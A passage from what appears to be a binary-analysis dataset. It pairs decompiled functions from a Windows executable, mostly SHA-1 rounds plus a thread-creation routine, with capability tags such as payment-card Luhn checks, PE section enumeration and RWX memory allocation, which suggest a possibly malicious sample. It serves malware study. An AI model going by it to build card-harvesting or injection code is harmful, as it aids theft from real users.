0x1b) + uVar3 + uVar18 + 0x5a827999;\n    uVar18 = var_88h >> 8 & 0xff00ff00 | var_88h << 0x18 | (var_88h & 0xff00) << 8 | var_88h >> 0x18;\n    uVar4 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar8 = uVar8 + 0x5a827999 + ((uVar14 ^ uVar20) & uVar13 ^ uVar14) + (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar18;\n    uVar13 = var_84h >> 8 & 0xff00ff00 | var_84h << 0x18 | (var_84h & 0xff00) << 8 | var_84h >> 0x18;\n    uVar9 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar13 + ((uVar20 ^ uVar4) & uVar19 ^ uVar20) + uVar14 + 0x5a827999;\n    uVar15 = var_80h >> 8 & 0xff00ff00 | var_80h << 0x18 | (var_80h & 0xff00) << 8 | var_80h >> 0x18;\n    uVar16 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar8 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar15 + ((uVar4 ^ uVar9) & uVar8 ^ uVar4) + uVar20 + 0x5a827999;\n    uVar21 = var_7ch >> 8 & 0xff00ff00 | var_7ch << 0x18 | (var_7ch & 0xff00) << 8 | var_7ch >> 0x18;\n    uVar22 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar21 + ((uVar16 ^ uVar9) & uVar19 ^ uVar9) + uVar4 + 0x5a827999;\n    uVar5 = var_78h >> 8 & 0xff00ff00 | var_78h << 0x18 | (var_78h & 0xff00) << 8 | var_78h >> 0x18;\n    uVar14 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar4 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar5 + ((uVar16 ^ uVar22) & uVar8 ^ uVar16) + uVar9 + 0x5a827999;\n    uVar10 = var_74h >> 8 & 0xff00ff00 | var_74h << 0x18 | (var_74h & 0xff00) << 8 | var_74h >> 0x18;\n    uVar20 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar16 = uVar16 + 0x5a827999 + ((uVar22 ^ uVar14) & uVar19 ^ uVar22) + (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar10;\n    uVar8 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar19 = var_70h >> 8 & 0xff00ff00 | var_70h << 0x18 | (var_70h & 0xff00) << 8 | var_70h >> 0x18;\n    uVar9 = (uVar14 ^ (uVar14 ^ uVar20) & uVar4) + (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar19 + uVar22 + 0x5a827999;\n    uVar22 = uVar4 >> 2 | uVar4 * 0x40000000;\n    uVar4 = var_6ch >> 8 & 0xff00ff00 | var_6ch << 0x18 | (var_6ch & 0xff00) << 8 | var_6ch >> 0x18;\n    uVar16 = (uVar16 & (uVar20 ^ uVar22) ^ uVar20) + (uVar9 * 0x20 | uVar9 >> 0x1b) + uVar4 + uVar14 + 0x5a827999;\n    uVar14 = var_68h >> 8 & 0xff00ff00 | var_68h << 0x18 | (var_68h & 0xff00) << 8 | var_68h >> 0x18;\n    uVar6 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar23 = (uVar22 ^ (uVar8 ^ uVar22) & uVar9) + (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar14 + uVar20 + 0x5a827999;\n    uVar9 = var_64h >> 8 & 0xff00ff00 | var_64h << 0x18 | (var_64h & 0xff00) << 8 | var_64h >> 0x18;\n    uVar17 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar11 = (uVar8 ^ (uVar8 ^ uVar6) & uVar16) + (uVar23 * 0x20 | uVar23 >> 0x1b) + uVar9 + uVar22 + 0x5a827999;\n    uVar20 = var_60h >> 8 & 0xff00ff00 | var_60h << 0x18 | (var_60h & 0xff00) << 8 | var_60h >> 0x18;\n    uVar7 = uVar14 ^ uVar21 ^ uVar1 ^ uVar7;\n    uVar16 = uVar7 << 1 | uVar7 < 0;\n    uVar8 = (uVar6 ^ (uVar6 ^ uVar17) & uVar23) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar20 + uVar8 + 0x5a827999;\n    uVar24 = uVar23 >> 2 | uVar23 * 0x40000000;\n    uVar12 = uVar9 ^ uVar5 ^ uVar2 ^ uVar12;\n    uVar22 = uVar12 << 1 | uVar12 < 0;\n    uVar7 = (uVar17 ^ (uVar17 ^ uVar24) & uVar11) + (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar16 + uVar6 + 0x5a827999;\n    uVar12 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar1 = uVar20 ^ uVar10 ^ uVar3 ^ uVar1;\n    uVar6 = uVar1 << 1 | uVar1 < 0;\n    uVar17 = (uVar24 ^ (uVar24 ^ uVar12) & uVar8) + (uVar7 * 0x20 | uVar7 >> 0x1b) + uVar22 + uVar17 + 0x5a827999;\n    uVar1 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar23 = uVar7 >> 2 | uVar7 * 0x40000000;\n    uVar8 = uVar19 ^ uVar18 ^ uVar2 ^ uVar16;\n    uVar11 = (uVar12 ^ (uVar1 ^ uVar12) & uVar7) + (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar6 + uVar24 + 0x5a827999;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar24 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar7 = uVar4 ^ uVar13 ^ uVar3 ^ uVar22;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar2 = (uVar1 ^ (uVar1 ^ uVar23) & uVar17) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar8 + uVar12 + 0x5a827999;\n    uVar17 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar12 = uVar14 ^ uVar15 ^ uVar18 ^ uVar6;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar18 = (uVar23 ^ uVar24 ^ uVar11) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar7 + uVar1 + 0x6ed9eba1;\n    uVar3 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar13 = uVar9 ^ uVar21 ^ uVar13 ^ uVar8;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar2 = (uVar24 ^ uVar17 ^ uVar2) + (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar12 + uVar23 + 0x6ed9eba1;\n    uVar23 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar1 = uVar20 ^ uVar5 ^ uVar15 ^ uVar7;\n    uVar1 = uVar1 << 1 | uVar1 < 0;\n    uVar11 = (uVar17 ^ uVar18 ^ uVar3) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar13 + uVar24 + 0x6ed9eba1;\n    uVar18 = uVar17 + 0x6ed9eba1 + (uVar23 ^ uVar2 ^ uVar3) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar1;\n    uVar24 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar10 ^ uVar21 ^ uVar12 ^ uVar16;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar15 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar2 + (uVar23 ^ uVar24 ^ uVar11) + uVar3 + 0x6ed9eba1;\n    uVar3 = uVar19 ^ uVar5 ^ uVar13 ^ uVar22;\n    uVar3 = uVar3 << 1 | uVar3 < 0;\n    uVar17 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar3 + (uVar24 ^ uVar15 ^ uVar18) + uVar23 + 0x6ed9eba1;\n    uVar18 = uVar4 ^ uVar10 ^ uVar1 ^ uVar6;\n    uVar18 = uVar18 << 1 | uVar18 < 0;\n    uVar23 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar18 + (uVar15 ^ uVar17 ^ uVar11) + uVar24 + 0x6ed9eba1;\n    uVar19 = uVar14 ^ uVar19 ^ uVar2 ^ uVar8;\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar21 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar19 + (uVar5 ^ uVar17 ^ uVar23) + uVar15 + 0x6ed9eba1;\n    uVar4 = uVar9 ^ uVar4 ^ uVar3 ^ uVar7;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar17 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar4 + (uVar21 ^ uVar11 ^ uVar23) + uVar17 + 0x6ed9eba1;\n    uVar14 = uVar20 ^ uVar14 ^ uVar18 ^ uVar12;\n    uVar14 = uVar14 << 1 | uVar14 < 0;\n    uVar15 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar10 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar11 = (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar14 + (uVar21 ^ uVar15 ^ uVar5) + uVar23 + 0x6ed9eba1;\n    uVar9 = uVar9 ^ uVar19 ^ uVar13 ^ uVar16;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar23 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar9 + (uVar15 ^ uVar10 ^ uVar17) + uVar21 + 0x6ed9eba1;\n    uVar20 = uVar20 ^ uVar4 ^ uVar1 ^ uVar22;\n    uVar20 = uVar20 << 1 | uVar20 < 0;\n    uVar21 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar20 + (uVar10 ^ uVar23 ^ uVar11) + uVar15 + 0x6ed9eba1;\n    uVar16 = uVar14 ^ uVar2 ^ uVar6 ^ uVar16;\n    uVar16 = uVar16 << 1 | uVar16 < 0;\n    uVar17 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar16 + (uVar5 ^ uVar23 ^ uVar21) + uVar10 + 0x6ed9eba1;\n    uVar22 = uVar9 ^ uVar3 ^ uVar8 ^ uVar22;\n    uVar22 = uVar22 << 1 | uVar22 < 0;\n    uVar10 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar22 + (uVar17 ^ uVar11 ^ uVar21) + uVar23 + 0x6ed9eba1;\n    uVar6 = uVar20 ^ uVar18 ^ uVar7 ^ uVar6;\n    uVar6 = uVar6 << 1 | uVar6 < 0;\n    uVar23 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar6 + (uVar17 ^ uVar10 ^ uVar5) + uVar21 + 0x6ed9eba1;\n    uVar8 = uVar19 ^ uVar12 ^ uVar8 ^ uVar16;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar24 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar10 ^ uVar23 ^ uVar11) + (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar8 + uVar17 + 0x6ed9eba1;\n    uVar7 = uVar4 ^ uVar13 ^ uVar7 ^ uVar22;\n    uVar17 = uVar7 << 1 | uVar7 < 0;\n    uVar15 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar17 + (uVar23 ^ uVar24 ^ uVar5) + uVar10 + 0x6ed9eba1;\n    uVar7 = uVar14 ^ uVar1 ^ uVar12 ^ uVar6;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar10 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar7 + (uVar11 ^ uVar24 ^ uVar15) + uVar23 + 0x6ed9eba1;\n    uVar13 = uVar9 ^ uVar2 ^ uVar13 ^ uVar8;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar21 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar13 + (uVar10 ^ uVar5 ^ uVar15) + uVar24 + 0x6ed9eba1;\n    uVar12 = uVar20 ^ uVar3 ^ uVar1 ^ uVar17;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar24 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar15 = (uVar10 ^ uVar21 ^ uVar11) + (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar12 + uVar15 + 0x6ed9eba1;\n    uVar1 = uVar18 ^ uVar2 ^ uVar7 ^ uVar16;\n    uVar11 = uVar1 << 1 | uVar1 < 0;\n    uVar23 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar1 = (uVar15 * 0x20 | uVar15 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar24 | uVar5) & uVar21 | uVar24 & uVar5) + uVar11 + uVar10;\n    uVar2 = uVar19 ^ uVar3 ^ uVar13 ^ uVar22;\n    uVar5 = uVar2 << 1 | uVar2 < 0;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar23 | uVar15) & uVar24 | uVar23 & uVar15) + uVar5 + uVar21;\n    uVar3 = uVar4 ^ uVar18 ^ uVar12 ^ uVar6;\n    uVar10 = uVar3 << 1 | uVar3 < 0;\n    uVar18 = uVar15 >> 2 | uVar15 * 0x40000000;\n    uVar3 = uVar14 ^ uVar19 ^ uVar11 ^ uVar8;\n    uVar15 = uVar3 << 1 | uVar3 < 0;\n    uVar3 = (uVar1 & uVar18 | (uVar1 | uVar18) & uVar23) + uVar10 + uVar24 + 0x8f1bbcdc + (uVar2 * 0x20 | uVar2 >> 0x1b)\n    ;\n    uVar24 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0x8f1bbcdc + ((uVar24 | uVar2) & uVar18 | uVar24 & uVar2) + uVar15 + uVar23\n    ;\n    uVar19 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar9 ^ uVar4 ^ uVar5 ^ uVar17;\n    uVar23 = uVar2 << 1 | uVar2 < 0;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar19 | uVar3) & uVar24 | uVar19 & uVar3) + uVar23 + uVar18\n    ;\n    uVar18 = uVar20 ^ uVar14 ^ uVar10 ^ uVar7;\n    uVar14 = uVar18 << 1 | uVar18 < 0;\n    uVar21 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar25 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0x8f1bbcdc + ((uVar21 | uVar1) & uVar19 | uVar21 & uVar1) + uVar14 + uVar24\n    ;\n    uVar3 = uVar9 ^ uVar15 ^ uVar13 ^ uVar16;\n    uVar9 = uVar3 << 1 | uVar3 < 0;\n    uVar3 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar25 | uVar2) & uVar21 | uVar25 & uVar2) + uVar9 + uVar19;\n    uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar20 ^ uVar23 ^ uVar12 ^ uVar22;\n    uVar20 = uVar2 << 1 | uVar2 < 0;\n    uVar16 = uVar14 ^ uVar11 ^ uVar6 ^ uVar16;\n    uVar18 = uVar16 << 1 | uVar16 < 0;\n    uVar2 = (uVar1 & uVar4 | (uVar1 | uVar4) & uVar25) + uVar20 + uVar21 + 0x8f1bbcdc + (uVar3 * 0x20 | uVar3 >> 0x1b);\n    uVar16 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0x8f1bbcdc + ((uVar16 | uVar3) & uVar4 | uVar16 & uVar3) + uVar18 + uVar25;\n    uVar24 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar22 = uVar9 ^ uVar5 ^ uVar8 ^ uVar22;\n    uVar19 = uVar22 << 1 | uVar22 < 0;\n    uVar3 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar24 | uVar2) & uVar16 | uVar24 & uVar2) + uVar19 + uVar4;\n    uVar6 = uVar20 ^ uVar10 ^ uVar17 ^ uVar6;\n    uVar22 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar4 = uVar6 << 1 | uVar6 < 0;\n    uVar21 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0x8f1bbcdc + ((uVar22 | uVar1) & uVar24 | uVar22 & uVar1) + uVar4 + uVar16;\n    uVar8 = uVar15 ^ uVar7 ^ uVar8 ^ uVar18;\n    uVar16 = uVar8 << 1 | uVar8 < 0;\n    uVar8 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar21 | uVar3) & uVar22 | uVar21 & uVar3) + uVar16 + uVar24\n    ;\n    uVar2 = uVar23 ^ uVar13 ^ uVar17 ^ uVar19;\n    uVar6 = uVar2 << 1 | uVar2 < 0;\n    uVar3 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar7 = uVar14 ^ uVar12 ^ uVar7 ^ uVar4;\n    uVar17 = uVar7 << 1 | uVar7 < 0;\n    uVar7 = (uVar1 & uVar3 | (uVar1 | uVar3) & uVar21) + uVar6 + uVar22 + 0x8f1bbcdc + (uVar8 * 0x20 | uVar8 >> 0x1b);\n    uVar1 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar8 = (uVar7 * 0x20 | uVar7 >> 0x1b) + 0x8f1bbcdc + ((uVar1 | uVar8) & uVar3 | uVar1 & uVar8) + uVar17 + uVar21;\n    uVar13 = uVar9 ^ uVar11 ^ uVar13 ^ uVar16;\n    uVar21 = uVar13 << 1 | uVar13 < 0;\n    uVar22 = uVar7 >> 2 | uVar7 * 0x40000000;\n    uVar13 = (uVar8 * 0x20 | uVar8 >> 0x1b) + 0x8f1bbcdc + ((uVar2 | uVar7) & uVar1 | uVar2 & uVar7) + uVar21 + uVar3;\n    uVar7 = uVar20 ^ uVar5 ^ uVar12 ^ uVar6;\n    uVar24 = uVar7 << 1 | uVar7 < 0;\n    uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar12 = (uVar13 * 0x20 | uVar13 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar22 | uVar8) & uVar2 | uVar22 & uVar8) + uVar24 + uVar1;\n    uVar8 = uVar10 ^ uVar11 ^ uVar17 ^ uVar18;\n    uVar11 = uVar8 << 1 | uVar8 < 0;\n    uVar8 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar1 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar7 | uVar13) & uVar22 | uVar7 & uVar13) + uVar11 + uVar2;\n    uVar13 = uVar15 ^ uVar5 ^ uVar21 ^ uVar19;\n    uVar5 = uVar13 << 1 | uVar13 < 0;\n    uVar2 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar22 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar12 | uVar8) & uVar7 | uVar12 & uVar8) + uVar5 + uVar22;\n    uVar13 = uVar23 ^ uVar10 ^ uVar24 ^ uVar4;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar12 = uVar14 ^ uVar15 ^ uVar11 ^ uVar16;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar15 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar3 = (uVar22 * 0x20 | uVar22 >> 0x1b) + 0x8f1bbcdc + ((uVar2 | uVar1) & uVar8 | uVar2 & uVar1) + uVar13 + uVar7;\n    uVar7 = uVar9 ^ uVar23 ^ uVar5 ^ uVar6;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + ((uVar15 | uVar22) & uVar2 | uVar15 & uVar22) + 0x8f1bbcdc + uVar12 + uVar8\n    ;\n    uVar23 = uVar22 >> 2 | uVar22 * 0x40000000;\n    uVar10 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0xca62c1d6 + (uVar15 ^ uVar23 ^ uVar3) + uVar7 + uVar2;\n    uVar8 = uVar20 ^ uVar14 ^ uVar13 ^ uVar17;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar22 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar3 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0xca62c1d6 + (uVar23 ^ uVar10 ^ uVar1) + uVar8 + uVar15;\n    uVar1 = uVar9 ^ uVar12 ^ uVar21 ^ uVar18;\n    uVar1 = uVar1 << 1 | uVar1 < 0;\n    uVar9 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0xca62c1d6 + (uVar2 ^ uVar10 ^ uVar22) + uVar1 + uVar23;\n    uVar15 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar20 ^ uVar7 ^ uVar24 ^ uVar19;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar25 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar14 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar15 ^ uVar3 ^ uVar22) + 0xca62c1d6 + uVar2 + uVar10;\n    uVar18 = uVar8 ^ uVar11 ^ uVar4 ^ uVar18;\n    uVar3 = uVar18 << 1 | uVar18 < 0;\n    uVar20 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar9 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar15 ^ uVar25 ^ uVar9) + uVar3 + uVar22 + 0xca62c1d6;\n    uVar19 = uVar1 ^ uVar5 ^ uVar16 ^ uVar19;\n    uVar22 = uVar19 << 1 | uVar19 < 0;\n    uVar10 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar25 ^ uVar20 ^ uVar14) + uVar22 + uVar15 + 0xca62c1d6;\n    uVar4 = uVar2 ^ uVar13 ^ uVar6 ^ uVar4;\n    uVar18 = uVar4 << 1 | uVar4 < 0;\n    uVar23 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar9 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar20 ^ uVar10 ^ uVar9) + uVar18 + uVar25 + 0xca62c1d6;\n    uVar19 = uVar12 ^ uVar17 ^ uVar16 ^ uVar3;\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar25 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar20 = (uVar9 * 0x20 | uVar9 >> 0x1b) + (uVar14 ^ uVar10 ^ uVar23) + 0xca62c1d6 + uVar19 + uVar20;\n    uVar4 = uVar7 ^ uVar21 ^ uVar6 ^ uVar22;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar15 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar14 = (uVar25 ^ uVar9 ^ uVar23) + uVar4 + uVar10 + 0xca62c1d6 + (uVar20 * 0x20 | uVar20 >> 0x1b);\n    uVar9 = uVar8 ^ uVar24 ^ uVar17 ^ uVar18;\n    uVar17 = uVar9 << 1 | uVar9 < 0;\n    uVar16 = uVar20 >> 2 | uVar20 * 0x40000000;\n    uVar10 = uVar23 + 0xca62c1d6 + (uVar25 ^ uVar15 ^ uVar20) + uVar17 + (uVar14 * 0x20 | uVar14 >> 0x1b);\n    uVar9 = uVar1 ^ uVar11 ^ uVar21 ^ uVar19;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar20 = (uVar15 ^ uVar16 ^ uVar14) + uVar9 + uVar25 + 0xca62c1d6 + (uVar10 * 0x20 | uVar10 >> 0x1b);\n    uVar21 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = uVar2 ^ uVar5 ^ uVar24 ^ uVar4;\n    uVar6 = uVar14 << 1 | uVar14 < 0;\n    uVar23 = uVar10 >> 2 | uVar10 * 0x40000000;\n    uVar14 = (uVar16 ^ uVar21 ^ uVar10) + uVar6 + uVar15 + (uVar20 * 0x20 | uVar20 >> 0x1b) + 0xca62c1d6;\n    uVar10 = uVar13 ^ uVar11 ^ uVar17 ^ uVar3;\n    uVar11 = uVar12 ^ uVar5 ^ uVar9 ^ uVar22;\n    uVar10 = uVar10 << 1 | uVar10 < 0;\n    uVar5 = uVar11 << 1 | uVar11 < 0;\n    uVar16 = (uVar20 ^ uVar21 ^ uVar23) + uVar10 + uVar16 + 0xca62c1d6 + (uVar14 * 0x20 | uVar14 >> 0x1b);\n    uVar20 = uVar20 >> 2 | uVar20 * 0x40000000;\n    uVar11 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar18 = uVar7 ^ uVar13 ^ uVar6 ^ uVar18;\n    uVar13 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar15 = uVar21 + 0xca62c1d6 + (uVar20 ^ uVar14 ^ uVar23) + uVar5 + (uVar16 * 0x20 | uVar16 >> 0x1b);\n    uVar14 = uVar18 << 1 | uVar18 < 0;\n    uVar19 = uVar8 ^ uVar12 ^ uVar10 ^ uVar19;\n    uVar12 = (uVar20 ^ uVar11 ^ uVar16) + 0xca62c1d6 + uVar14 + uVar23 + (uVar15 * 0x20 | uVar15 >> 0x1b);\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar16 = uVar15 >> 2 | uVar15 * 0x40000000;\n    uVar18 = (uVar11 ^ uVar13 ^ uVar15) + uVar19 + uVar20 + (uVar12 * 0x20 | uVar12 >> 0x1b) + 0xca62c1d6;\n    uVar4 = uVar1 ^ uVar7 ^ uVar5 ^ uVar4;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar7 = (uVar18 * 0x20 | uVar18 >> 0x1b) + (uVar13 ^ uVar16 ^ uVar12) + 0xca62c1d6 + uVar4 + uVar11;\n    uVar12 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar17 = uVar2 ^ uVar8 ^ uVar14 ^ uVar17;\n    uVar3 = uVar1 ^ uVar19 ^ uVar9 ^ uVar3;\n    uVar1 = (uVar12 ^ uVar18 ^ uVar16) + 0xca62c1d6 + uVar13 +\n            (uVar17 << 1 | uVar17 < 0) + (uVar7 * 0x20 | uVar7 >> 0x1b);\n    uVar13 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar22 = uVar2 ^ uVar4 ^ uVar6 ^ uVar22;\n    uVar8 = (uVar3 << 1 | uVar3 < 0) + (uVar1 * 0x20 | uVar1 >> 0x1b) + (uVar13 ^ uVar7 ^ uVar12) + 0xca62c1d6 + uVar16;\n    uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;\n    var_5ch[2] = var_5ch[2] + (uVar1 >> 2 | uVar1 * 0x40000000);\n    var_5ch[3] = var_5ch[3] + uVar7;\n    var_5ch[1] = var_5ch[1] + uVar8;\n    var_5ch[4] = var_5ch[4] + uVar13;\n    *var_5ch = (uVar13 ^ uVar7 ^ uVar1) + *var_5ch +\n               (uVar8 * 0x20 | uVar8 >> 0x1b) + 0xca62c1d6 + (uVar22 << 1 | uVar22 < 0) + uVar12;\n    return;\n}\n",
        "token_count": 10798
    },
    "004076c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "create thread",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004076c0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpThreadAttributes;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    lpThreadAttributes = 0;\n    var_8h = fcn.00401085(0x1c);\n    iVar1 = arg_ch + 8;\n    piVar3 = var_8h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    var_8h[3] = *(arg_ch + 4);\n    fcn.00403437(iVar1);\n    var_8h[1] = arg_8h;\n    *var_8h = var_4h;\n    var_8h[6] = *(arg_ch + 4);\n    iVar2 = fcn.00401085(0x208);\n    fcn.0040362d(iVar1);\n    fcn.0040362d(iVar1);\n    iVar1 = fcn.00403261();\n    fcn.0040102c(iVar2, arg_ch, iVar1 * 2 + 2);\n    fcn.00405ea5();\n    fcn.00405ea5();\n    piVar3 = var_8h;\n    var_8h[5] = iVar2;\n    uVar4 = *(arg_ch + 4);\n    fcn.0041026f();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004073bb, piVar3, 0, &lpThreadAttributes);\n    fcn.00401e9c(arg_8h_00);\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(var_4h + 0x10), arg_8h_00, uVar4, piVar3);\n    return;\n}\n",
        "token_count": 510
    },
    "00407948": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "allocate memory",
            "allocate RWX memory",
